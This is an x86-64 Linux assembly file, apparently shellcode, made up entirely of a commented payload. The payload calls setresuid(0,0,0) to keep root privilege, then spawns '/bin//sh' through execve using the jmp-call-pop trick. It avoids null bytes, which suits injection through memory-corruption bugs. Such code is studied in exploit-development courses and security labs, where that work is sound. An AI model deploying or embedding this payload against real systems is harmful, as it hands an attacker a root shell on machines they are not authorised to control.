global _start

section .text

_start:
    ; Zeroing of general purpose registers
    xor rbx, rbx	; To be used for execve() later
    xor	rdx, rdx	; To be used for execve() as 3rd parameter later as well as pushing NULL

setresuid:		; To retain root privilege
    xor rax, rax	; Zeroes rax register
    add al, 117		; Syscall number for setresuid()

    ; setresuid(0,0,0)
    xor rdi, rdi	; 1st argument - 0
    xor rsi, rsi	; 2nd argument - 0
    xor rdx, rdx	; 3rd argument - 0

    syscall		; After setting the proper argument and setting proper values in registers, does a system call

    jmp short binSH	; jmp-call-pop technique

execve:			; execve("/bin//sh",["/bin//sh",0],0)
    xor rax, rax	; Zeroes rax register
    add al, 59		; Syscall number for execve()
    
    pop rdi		; 1st argument - "/bin//sh"

    ; [ "/bin//sh" | NULL ]
    push rdx		; Push NULL into stack
    push rdi		; Push "/bin//sh" into stack
    mov rbx, rsp	; rbx - Stack address containing value of "/bin//sh"

    ; [ ptr to "/bin//sh" | NULL | "/bin//sh" | NULL ]
    push rdx		; Push NULL into stack
    push rbx		; Push ptr to "/bin//sh" into stack

    mov rsi, rsp	; 2nd argument - ["/bin//sh",0]
    syscall

binSH:
    call execve		; When call is used, the next instruction eg. shell: db '/bin//sh', will be pushed into the stack
    shell: db '/bin//sh'
